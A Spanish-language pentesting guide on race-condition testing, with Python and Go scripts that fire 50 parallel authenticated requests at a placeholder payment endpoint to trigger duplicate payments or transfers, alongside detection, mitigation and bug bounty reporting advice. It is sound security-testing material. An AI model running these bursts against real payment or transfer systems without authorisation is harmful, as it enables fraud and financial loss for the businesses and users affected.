# Harness de Pruebas (Go/Python)

## Resumen

**Qué es:** Un *harness* de pruebas permite automatizar el lanzamiento de peticiones concurrentes/paralelas para descubrir condiciones de carrera, fallos lógicos y abusos de negocio en endpoints críticos, usando código ligero y personalizable en Go o Python.
**Por qué importa:** Permite detectar errores y duplicidad no visibles en test manual, reproducir escenarios de abuso, lanzar ráfagas de requests y automatizar POCs reproducibles para bug bounty o pentesting profesional.
**Cuándo aplicarlo:** Siempre que se requiera validar lógica de concurrencia (pagos, compras, registro, transferencias) o reconstruir/explotar condiciones de carrera desde CI/CD o scripts personales.

---

## Contexto

**Supuestos:**

- Acceso a endpoints HTTP(s) o gRPC.
- Capacidad de ejecutar scripts locales (Python 3.x, Go 1.14+).
- Endpoints abiertos a fuzzing/burst concurrente: POST/PUT pago, compra, transferencia, registro, canje de cupón/código.
- Objetivo de reproducibilidad y personalización/adaptación al flujo del cliente.

**Límites:**

- No cubre harnesses para pruebas unitarias de lógica interna (típico de testing profesional, no bug bounty).
- Foco en ataques black/grey box, con adaptabilidad al endpoint real.

---

## Metodología

1. **Identificar endpoint crítico y estructura de payload/headers.**
2. **Definir número de threads/goroutines, datos paralelos (payloads, tokens, IDs).**
3. **Armar script en Go o Python para lanzar N requests simultáneas.**
4. **Recopilar y analizar respuestas, logs y colisiones/duplicidades.**
5. **Automatizar comparación de estados antes y después del ataque.**
6. **Ajustar payload o parámetro según respuesta detectada.**

**Checklist mínima:**

- Requests paralelizados y parametrizables.
- Recolecta respuestas y errores HTTP.
- Registra tiempo, cantidad de aciertos y errores.
- Fácil edición para cambiar URL, body y headers.

---

## PoC Python: Harness Multithread

```python
import requests
import threading

endpoint = "https://victima.com/api/pago"
payload = {"usuario":"victima", "importe": 100}
headers = {"Authorization": "Bearer TU_TOKEN"}

def atacar():
    r = requests.post(endpoint, json=payload, headers=headers)
    print(r.status_code, r.text)

threads = [threading.Thread(target=atacar) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
```

- **Resultado esperado:** Ver si el pago se realiza varias veces, errores o inconsistencias de estado tras ataque.

---

## PoC Go: Harness con Goroutines

```go
package main

import (
    "bytes"
    "fmt"
    "net/http"
    "sync"
)

func main() {
    endpoint := "https://victima.com/api/pago"
    payload := []byte(`{"usuario": "victima", "importe": 100}`)
    var wg sync.WaitGroup

    for i := 0; i < 50; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            req, _ := http.NewRequest("POST", endpoint, bytes.NewBuffer(payload))
            req.Header.Set("Content-Type", "application/json")
            req.Header.Set("Authorization", "Bearer TU_TOKEN")
            resp, err := http.DefaultClient.Do(req)
            if err != nil {
                fmt.Println("error:", err)
                return
            }
            fmt.Println(resp.Status)
            resp.Body.Close()
        }()
    }
    wg.Wait()
}
```

- **Resultado esperado:** Duplicidad de pagos o estado inconsistente tras corrida.

---

## Opciones Avanzadas

- Parametrizar IDs/tokens (lectura desde lista de usuarios/códigos).
- Medir tiempo de respuesta con timestamps.
- Guardar todas las respuestas en archivo/log para análisis.
- Opcional: cargar cookies/sesión desde fichero.
- Automatizar retries/fallback ante errores específicos.

---

## Explotación y Automatización

- Lanzar el harness con scripts customizados en CI/CD tras cada cambio en backend crítico.
- Usar para validar hotfix o remediaciones de race conditions.
- Integrar con Burp Collaborator para verificar ejecución/impacto en tiempo real.

---

## Impacto

- **Race detectado:** Multipago, registro duplicado, canje indebido, transferencia doble.
- **Pruebas reproducibles:** Evidencias objetivas para reporte y discusión.
- **Eficiencia:** Detección de fallos rápidamente en alta concurrencia.

---

## Detección

- Revisar logs de respuestas: ocurrencias de 200/201/409.
- Auditar base de datos tras ejecución.
- Buscar inconsistencias en recursos afectados.

---

## Mitigación

- Atomicidad y locks en backend.
- Idempotencia real de endpoints.
- Auditar respuestas inconsistentes y adaptar harness.

---

## Errores Comunes

- Olvidar join de threads/goroutines (resultados incompletos).
- No capturar errores HTTP.
- Lanzar más requests de las que una API puede procesar sin rate limiting (lockout tras detección de abuso).

---

## Reporte

**Título:** Harness automatizado permite reproducir y explotar condiciones de carrera en endpoint crítico
**Impacto:** Multipago, fraude, pérdidas financieras y abuso lógico reproducible
**Pasos:**

1. Configurar script y lanzar N requests paralelas contra endpoint sensible
2. Validar respuestas/estado/errores tras la prueba
3. Documentar resultados/impacto en logs, BD y negocio
